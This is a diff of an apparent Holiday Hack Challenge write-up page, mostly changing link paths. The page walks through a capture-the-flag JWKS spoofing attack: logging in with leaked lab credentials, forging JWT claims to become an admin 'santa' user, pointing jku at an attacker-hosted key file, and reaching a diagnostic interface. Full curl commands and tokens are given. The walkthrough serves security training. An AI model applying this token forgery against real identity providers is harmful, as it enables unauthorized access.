@@ -1,25 +1,16 @@
 ﻿---
 nav: |
   <table>
-  <thead><tr><th><a href="/act2_dosis_network_down_mjd.html">Previous Objective: Act2 Dosis Network Down</a></th> <th><a href="/index.html">Home Page</a></th> <th><a href="/act2_quantgnome_leap_mjd.html">Next Objective: Act2 Quantgnome Leap</a></th></table>
-  
+  <thead><tr><th><a href="/HHC_2025/act2_dosis_network_down_mjd.html">Previous Objective: Act2 Dosis Network Down</a></th> <th><a href="/HHC_2025/index.html">Home Page</a></th> <th><a href="/HHC_2025/act2_quantgnome_leap_mjd.html">Next Objective: Act2 Quantgnome Leap</a></th></table>
 ---
-
 <table>
 <thead><tr><th>Objective: Rogue Gnome Identity Provider</th> <th>Difficulty Level: 2</th><tr><td>Hike over to Paul in the park for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?</td> <td>Location: Dosis Neighborhood Park</td></table>
-
-
-## Solution Overview
-
+<h2>Solution Overview</h2>
 The attack begins by using exposed gnome credentials (gnome:SittingOnAShelf) to authenticate against the Identity Provider (IDP). This login returns a JSON Web Token (JWT), which is then analyzed. By exploiting weaknesses in JWT validation, the attacker modifies critical claims: changing the subject (sub) from gnome to santa, flipping the admin flag from false to true, and redirecting the jku field to a malicious JWKS file hosted on their own server.
-
 To support the attack, the attacker generates a fraudulent RSA key pair and publishes the public key in their rogue JWKS file, while signing the tampered token with the private key. The manipulated token is then passed to the target service, which incorrectly validates it against the attacker-controlled JWKS endpoint. This grants unauthorized access and a valid session cookie. Finally, the attacker uses the session to connect to the diagnostic interface, retrieving sensitive data â€” in this case, the file refrigeration-botnet.bin.
-
 <table>
 <thead><tr><th>Activity</th> <th>Primary Tactic</th> <th>MITRE ATT&CK Technique ID</th> <th>MITRE ATT&CK Technique Name</th><tr><td>Collecting exposed gnome credentials</td> <td>Credential Access</td> <td>T1552.001</td> <td>Unsecured Credentials: Passwords</td><tr><td>Authenticating to IDP and analyzing JWT</td> <td>Defense Evasion</td> <td>T1140</td> <td>Deobfuscate/Decode Files or Information</td><tr><td>Modifying JWT claims (<code>sub</code>, <code>admin</code>, <code>jku</code>)</td> <td>Defense Evasion</td> <td>T1600</td> <td>Modify Authentication Process</td><tr><td>Introducing fraudulent JWKS/public key</td> <td>Defense Evasion</td> <td>T1550.003</td> <td>Use Alternate Authentication Material</td><tr><td>Passing tampered token for access</td> <td>Persistence/Lateral Movement</td> <td>T1078.004</td> <td>Valid Accounts: SSH/Other</td><tr><td>Using session cookie to access diagnostics</td> <td>Impact</td> <td>T1499</td> <td>Endpoint Denial/Manipulation</td></table>
-
-
-## Detailed Solution
+<h2>Detailed Solution</h2>
 <details>
 <summary>Click to expand</summary>
 <p>URL: </p>
@@ -29,29 +20,21 @@ To support the attack, the attacker generates a fraudulent RSA key pair and publ
 <p>https://portswigger.net/web-security/jwt</p>
 <p>The notes.txt file contains some useful commands and a set of credentials:</p>
 <pre><code>
-# Credentials
-
-## Gnome credentials (found on a post-it):
+<h1>Credentials</h1>
+<h2>Gnome credentials (found on a post-it):</h2>
 Gnome:SittingOnAShelf
-
-# Curl Commands Used in Analysis of Gnome:
-
-## Gnome Diagnostic Interface authentication required page:
+<h1>Curl Commands Used in Analysis of Gnome:</h1>
+<h2>Gnome Diagnostic Interface authentication required page:</h2>
 curl http://gnome-48371.atnascorp
-
-## Request IDP Login Page
+<h2>Request IDP Login Page</h2>
 curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth
-
-## Authenticate to IDP
+<h2>Authenticate to IDP</h2>
 curl -X POST --data-binary $&#39;username=gnome&amp;password=SittingOnAShelf&amp;return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth&#39; http://idp.atnascorp/login
-
-## Pass Auth Token to Gnome
+<h2>Pass Auth Token to Gnome</h2>
 curl -v http://gnome-48371.atnascorp/auth?token=&lt;insert-JWT&gt;
-
-## Access Gnome Diagnostic Interface
+<h2>Access Gnome Diagnostic Interface</h2>
 curl -H &#39;Cookie: session=&lt;insert-session&gt;&#39; http://gnome-48371.atnascorp/diagnostic-interface
-
-## Analyze the JWT
+<h2>Analyze the JWT</h2>
 jwt_tool.py &lt;insert-JWT&gt;
 </code></pre>
 <p>Using the authenticate curl command from the notes combined with the credentials to login:</p>
@@ -68,7 +51,7 @@ paul@paulweb:~$ curl -X POST --data-binary $&#39;username=gnome&amp;password=Sit
 eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2Mjc4ODkxNCwiZXhwIjoxNzYyNzk2MTE0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.tUTjpDOvj1Yt0gRiLRT9LbD-L1cXfO2vrE0V0OzsV7zJi9THXE91feKN8KarI4Zf0MFgqFWc2I__dUbdpZpURBUaWW1HtLyNkwtzXGrAJuP0n7GM2ZnoK-EKTba1D9TBMOt4gyV_2jaA4QQcU32Oox9m-_GevjGJfL5PMpX1cAqLKQ_TfDxWiLyRYYKKjduEjIKYzC7pHLz_YGcYmmD855FW3FUA8AXJLn3XATnKgvqvHok_kE4HIWNWBvaXLmAD0lOWRloOhIptAMWnbTFAI7Y9YGCP0YMjZ4QUP2DTsgM7cYLSxwGAdWaTZpPm0ZUezw-ssT8wwMeF331SyGjwKg
 </code></pre>
 <p>Using JWT.IO to decode the token:</p>
-<p>!<a href="/images/roguegnomeidp_jwt.jpg">Decoding the token</a> </p>
+<p>!<a href="/HHC_2025/images/roguegnomeidp_jwt.jpg">Decoding the token</a> </p>
 <p>Lets look at the contents of the jwks.json file:</p>
 <pre><code>
 &lt;/html&gt;paul@paulweb:~$ curl -v http://idp.atnascorp/.well-known/jwks.json 
@@ -101,13 +84,12 @@ eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3Mu
 }
 </code></pre>
 <p>The /etc/passwd file is accessible. The username "santa" looks like a good one to use in the attack.</p>
-<p>!<a href="/images/roguegnomeidp_passwdfile.jpg">Contents of the Password file</a> </p>
+<p>!<a href="/HHC_2025/images/roguegnomeidp_passwdfile.jpg">Contents of the Password file</a> </p>
 <p>Using mkjwk - JSON Web Key Generator, generate the json web key:</p>
-<p>!<a href="/images/roguegnomeidp_keys.jpg">Generating JSON Web Key</a> </p>
+<p>!<a href="/HHC_2025/images/roguegnomeidp_keys.jpg">Generating JSON Web Key</a> </p>
 <pre><code>
 e: AQAB
 n: hJwH0hvuZC3HVpQocwmk76t8wQQOXWETMHnRuP_GlUHYpNZOQv2CKf2PAKLqD3uHubsdB8MPRPER2qqcIFKg9kR_CZBeEQkheALPCd6jNfPjqX7ic-PYB5VMXiV86QK6dxw9ecJUkKa5Ub_mK_KdCX03o0r-lZxsqxL_19Rv2eF8BEzWxClm_HFEaaJ3006MKjB6m2gM4eCezhywZOtJw0aZhpImD8VroPhMZ24OB-ml3jkCJfzHkMz8gybbIuxCTpcIcgf3U3H7lw7HiH2GdwT67yF03P3KMYTwjkCxpvueP9sFFmQpBcfocvkj2U1irLfZ9tbNJqKYuPNSd8H3_w
-
 {
     &quot;kty&quot;: &quot;RSA&quot;,
     &quot;e&quot;: &quot;AQAB&quot;,
@@ -161,7 +143,7 @@ dwT67yF03P3KMYTwjkCxpvueP9sFFmQpBcfocvkj2U1irLfZ9tbNJqKYuPNSd8H3
 <p>- admin changes from "false" to "true"</p>
 <p>- jku changes from "http://idp.atnascorp/.well-known/jwks.json" to "http:/paulweb.neighborhood/jwks.json"</p>
 <p>The token is signed using the Private key generated. The public key and the fraudulent JWKS file is placed in the www directory of paulweb.neighborhood.</p>
-<p>!<a href="/images/roguegnomeidp_tamperedjwt.jpg">Creating a Tampered Token</a>  </p>
+<p>!<a href="/HHC_2025/images/roguegnomeidp_tamperedjwt.jpg">Creating a Tampered Token</a>  </p>
 <p>Tampered token:</p>
 <pre><code>
 eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJpZHAta2V5LTIwMjUiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJzYW50YSIsImlhdCI6MTc2MjgxNjQ0NSwiZXhwIjoxNzYyODIzNjQ1LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.SHLrimPcjayFmHcgSAebHW_iLP1HErl_ce_NCoM2N4qGtOLmjzKUSFmahHECCW5ax0D2DEsAU77ghYjXTfOAOteLxeIlDs9csn0FMBzLCqROWRjW8setWVlfd0T98jwhopj78uk3pcRmkzuDH9gAUt46c3qic9y34LpEJm6DICh2h76UTlBVowIfbHr3KMDoernoFHThKPUEqEoEaredjt31xuQbDoZ844IPciovLnF9D83cbZoCzki0U93xfPuUAQszILY5iku76AhjCF6QTu25oXIxHs5MXn7wi6Pl5VlHLndz3S2bbnI5NnaVwtjpw7p33VfAYP-4fGvGdEMASA
@@ -174,32 +156,17 @@ curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0
 <pre><code>
 curl -H &#39;Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJzYW50YSJ9.aRJ4Fw.oA20V3TpQ5ST2sky_K3XDsllPSs; &#39; http://gnome-48371.atnascorp/diagnostic-interface
 </code></pre>
-<p>!<a href="/images/roguegnomeidp_diagnostic.jpg">Getting the Diagnostic Interface</a>   </p>
+<p>!<a href="/HHC_2025/images/roguegnomeidp_diagnostic.jpg">Getting the Diagnostic Interface</a>   </p>
 <p><strong>Answer:refrigeration-botnet.bin</strong></p>
 </details>
-
-## Tools Reference
-
+<h2>Tools Reference</h2>
 <table>
 <thead><tr><th>Tools Used</th> <th>Tool Version</th><tr><td>curl</td> <td>8.11.0</td> <td></td><tr><td><a href="https://JWT.IO">JSON Web Token (JWT) Debugger</a></td> <td>N/A</td><tr><td><a href="https://8gwifi.org/jwkconvertfunctions.jsp">JWK to PEM Converter</a></td> <td>N/A</td> <td></td><tr><td><a href="https://mkjwk.org/">JSON Web Key generator</a></td> <td>N/A</td></table>
-
-
-## Hints Reference
+<h2>Hints Reference</h2>
 <table>
 <thead><tr><th>Provided By</th> <th>Hint</th><tr><td>Santa</td> <td>If you need to host any files for the attack, the server is running a webserver available locally at http://paulweb.neighborhood/ . The files for the site are stored in ~/www</td><tr><td>Santa</td> <td>https://github.com/ticarpi/jwt_tool/wiki and https://portswigger.net/web-security/jwt have some great information on analyzing JWT's and performing JWT attacks.</td><tr><td>Santa</td> <td>It looks like the JWT uses JWKS. Maybe a JWKS spoofing attack would work.</td><tr><td>Paul</td> <td>As a pentester, I proper love a good privilege escalation challenge, and that's exactly what we've got here. I've got access to a Gnome's Diagnostic Interface at gnome-48371.atnascorp with the creds gnome:SittingOnAShelf, but it's just a low-privilege account. The gnomes are getting some dodgy updates, and I need admin access to see what's actually going on. Ready to help me find a way to bump up our access level, yeah?</td></table>
-
-
-## Acknowledgements
+<h2>Acknowledgements</h2>
 <table>
 <thead><tr><th>Provided By</th> <th>Notes</th><tr><td>eucrates</td> <td>suggested using the jwk to pem convertor website (https://8gwifi.org/jwkconvertfunctions.jsp)</td></table>
-
-
-
 <table>
-<thead><tr><th><a href="/act2_dosis_network_down_mjd.html">Previous Objective: Act2 Dosis Network Down</a></th> <th><a href="/index.html">Home Page</a></th> <th><a href="/act2_quantgnome_leap_mjd.html">Next Objective: Act2 Quantgnome Leap</a></th></table>
-
-
-
-
-
-
+<thead><tr><th><a href="/HHC_2025/act2_dosis_network_down_mjd.html">Previous Objective: Act2 Dosis Network Down</a></th> <th><a href="/HHC_2025/index.html">Home Page</a></th> <th><a href="/HHC_2025/act2_quantgnome_leap_mjd.html">Next Objective: Act2 Quantgnome Leap</a></th></table>
